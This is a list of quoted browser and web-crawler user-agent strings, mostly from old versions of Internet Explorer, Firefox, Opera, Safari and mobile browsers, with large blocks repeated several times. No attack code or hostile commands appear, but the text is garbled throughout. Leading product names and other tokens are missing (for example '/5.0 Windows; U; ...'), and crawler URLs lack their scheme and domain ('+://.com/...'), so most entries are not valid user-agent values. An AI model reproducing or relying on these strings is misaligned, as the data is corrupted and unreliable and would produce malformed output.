	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 ; 008/0.83; ://www.80legs.com/webcrawler.html Gecko/2008032620"
	"/4.0 ; MSIE 7.0; Windows NT 6.0  www.idealobserver.com"
	"/5.0 ; /1.0; +://www.anyapex.com/.html"
	"/4.0 ; Arachmo"
	"/4.0 ; B-l-i--z-B-O-T"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; /2.3; MSIE 6.0 ; +://.com/site_owners.html"
	"/1.0 +://.com/crawler/"
	"/5.0 ; /2.0; +://.com/.htm"
	"Sqworm/2.9.85-BETA beta_release; 20011115-775; i686-pc-linux-"
	"/5.0 ; YandexImages/3.0; +://yandex.com/bots"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/4.0  /1.0  Link Checker @; ://.com"
	"/4.0  /1.0  Link Checker .dlc@; ://.com"
	"/4.0  /1.0 -@; ://.com"
	"/5.0 ; U;  0.6;  /420+ KHTML,  Gecko"
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;  Browser"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser; GTB6; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko, Safari/419.3 /1.0.ALPHA"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko ChromePlus/4.0.222.3 /4.0.222.3 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
	"Links 2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; "
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A"
	"/5.0 PLAYSTATION 3; 3.55"
	"/5.0 PLAYSTATION 3; 2.00"
	"/5.0 PLAYSTATION 3; 1.00"
	"/5.0 Windows NT 6.3; WOW64; rv:24.0 Gecko/20100101 /24.4.0"
	"/5.0 ; /1.0; +://www.abilogic.com/.html"
	"SiteBar/3.3.8 Bookmark Server; :///"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"/4.0 ;  3.0; Macintosh"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 FM  4.6.1"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729 Prevx 3.0.5 "
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071004 Iceweasel/2.0.0.8 -2.0.0.6+2.0.0.8-Oetch1"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07}"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=;  DSL 1.1; "
	"/4.0 ; MSIE 5.5; Windows 98"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.51"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600# Pack 1#2#5#154321|"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1;  Toolbar; ; .NET CLR 1.1.4322"
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/2.1 ://.com/.html"
	"/9.20 Windows NT 6.0; U; "
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 -2.0.0.1+-2"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; /4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322"
	"/10.00 X11; Linux i686; U;  Presto/2.2.0"
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 ; Yahoo! /3.0; ://.yahoo.com//us/ysearch/"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13"
	"/4.0 ; MSIE 9.0; Windows NT 5.1; /5.0"
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 7.0b; Windows NT 6.0"
	"/4.0 ; MSIE 6.0b; Windows 98"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7"
	"/5.0 ; /2.1; +://.com/.html"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"YahooSeeker/1.2 ;  4.0; MSIE 5.5; yahooseeker  yahoo-inc  com ; ://.yahoo.com//us///"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"-; +://.com/; : webetrex"
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
